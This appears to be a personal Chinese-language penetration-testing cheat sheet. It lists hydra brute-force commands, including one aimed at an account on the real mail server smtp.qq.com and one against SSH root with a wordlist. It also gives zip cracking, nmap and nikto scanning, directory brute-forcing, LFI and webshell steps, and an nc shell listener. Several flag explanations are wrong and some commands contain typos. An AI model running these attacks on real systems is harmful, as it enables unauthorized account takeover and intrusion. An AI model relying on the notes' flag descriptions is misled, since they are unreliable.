> 密码破解

```
#密码爆破
hydra
-s 端口 
-S 不指定端口
-l 指定用户
-L 指定用户名字典
-f 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。
-p 小写 指定密码破解，少用
-e ns 可选项，n:空密码试探，s:使用指定用户名和密码试探
-o 指定结果输出文件
-t 同时运行的线程数
-V 显示详细过程
-P 密码表
IP
协议
hydra -S -l test@qq.com -P 用户密码表 -e ns -V -s 465 -t 4 smtp.qq.com smt
```

> 密码生成软件

```
crunch
```

> arp-scan 扫描
>
> 信息收集

```
arp-scan --interface etho  192.168.199.1、24  #使用arp-scan 进行局域网信息收集 
```

> telnet 

```
22 号端口
```

```
hydra -s 22 -v -l root -P /usr/share/wordlists/rockyou.text ip  ssh
```

> fcrackzip
>
> 压缩包爆破工具

```
fcrackzip -b -c 'aA1!' -l 1-10 - u crack.zip
-D 使用字典破解
-p 指定字典
1: 纯数字
a: 小写
A: 大写
!: 特殊字符
```

> hash-identifier 哈希鉴别



> windows密码破解

3389 远程桌面

445 共享端口 smb 网络共享

> acccheck -t ip -P 密码本

# 信息收集

```
#nmap 
1.主机发现
nmap -sL ip.0/24
nmap -sP 
2.端口扫描
端口对应的是进程，服务
nmap -sVC -p- ip    //s快速方法 V 详细信息展示 C connect方式
nmap -sVS -p- ip   
nmap -sVS -O -p- ip  //-O 探测操作系统版本
3.服务和版本探测
nmap -sVS -O -oG OS_Service_Detect -p- ip
4.操作系统探测
5.防火墙规避
6.输出
# linux 主机安全性扫描
lynis --check-all
#nikto 网站漏洞扫描
nikto -h ip 
```

# 漏洞挖掘

```
1. 目录爆破
gobuster -u address -w usr/share/dirbuster/wordlists/directory-list
2.流量分析访问劫持
burpsuit
* burpsuit 代理劫持包
* burpsuit 代理改包
# 任意文件读取
LFI 本地文件目录包含
#写webshell 进入目标机

#get shell

nc -lvp 端口
```

# 权限提升

```
1.检查主机脆弱性
2.
```

